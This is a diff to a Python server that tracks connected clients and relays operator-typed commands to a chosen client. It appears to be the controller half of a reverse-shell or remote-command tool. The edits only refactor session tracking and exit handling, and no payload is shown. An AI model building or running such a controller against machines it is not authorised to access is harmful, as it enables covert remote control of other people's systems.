@@ -31,6 +31,12 @@ def start_server(host='0.0.0.0', port=9999):
 
 
 def handle_client(client_socket, addr):
+    with client_connections_lock:
+        client_connections[addr] = {
+            'socket': client_socket,
+            'current_directory': '~'
+        }
+
     buffer = ""
     try:
         with client_socket as sock:
@@ -107,7 +113,6 @@ def command_loop():
 
         try:
                 print('[*] Enter client IP and port to send commands.')
-                print('[*] Type "exit" to quit.')
                 print('[*] Connected clients:')
                 with client_connections_lock:
                     for addr in client_connections:
@@ -116,6 +121,8 @@ def command_loop():
                 client_port = int(input("Enter client's port: "))
                 client_addr = (client_ip, client_port)
 
+                print('[*] Client connected. Type "exit" to quit.')
+
                 while True:
                     with client_connections_lock:
                         current_directory = client_connections.get(client_addr, {}).get('current_directory', '~')
@@ -123,7 +130,7 @@ def command_loop():
 
                     match message.strip():
                         case 'exit':
-                            exit()
+                            break
                         case 'clear':
                             os.system('clear')
                             continue
@@ -133,9 +140,9 @@ def command_loop():
                     with client_connections_lock:
                         client_connections[client_addr]['response_event'] = response_event
 
-                    send_to_client(client_addr, message)
-                    # Wait until the client response is received and printed
-                    response_event.wait()
+                    successful = send_to_client(client_addr, message)
+                    if successful:
+                        response_event.wait()
         except:
             print(f'[*] {client_ip}:{client_port} is not connected.')
 
